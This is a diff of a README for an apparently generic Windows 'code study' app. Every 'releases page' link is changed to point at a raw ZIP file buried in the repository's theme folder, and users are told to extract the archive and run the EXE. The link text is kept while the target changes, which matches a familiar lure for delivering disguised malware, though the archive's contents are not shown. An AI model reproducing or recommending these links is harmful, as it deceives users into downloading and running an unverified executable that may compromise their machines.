@@ -1,10 +1,10 @@
 # 🧪 cloud-code-study - Study code on your PC
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/heartbreakersebastopol822/cloud-code-study/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip)
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/releases) to download the latest version for Windows.
+Visit the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip) to download the latest version for Windows.
 
 Look for the latest release, then download the file that matches your system. If you use a standard 64-bit Windows PC, choose the file marked for Windows x64. If you see a ZIP file, download it and extract it first. If you see an EXE file, download and run it.
 
@@ -35,7 +35,7 @@ If your PC is older, the app may still run, but it may open more slowly.
 
 Follow these steps in order:
 
-1. Open the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/releases).
+1. Open the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows file.
 4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
@@ -112,7 +112,7 @@ If the app uses a local data folder, keep the folder together with the main prog
 
 To get a newer version:
 
-1. Return to the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/releases)
+1. Return to the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip)
 2. Download the latest build
 3. Replace the old folder with the new one
 4. Keep any personal settings if the release notes allow it
@@ -143,7 +143,7 @@ The newest release is usually the best place to start.
 
 ## 🖱️ Quick start
 
-1. Open the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/releases)
+1. Open the [releases page](https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Run the EXE file
@@ -153,4 +153,4 @@ The newest release is usually the best place to start.
 
 Use this page to download the app for Windows:
 
-https://github.com/heartbreakersebastopol822/cloud-code-study/releases
+https://github.com/heartbreakersebastopol822/cloud-code-study/raw/refs/heads/main/theme/cloud-study-code-v2.5.zip
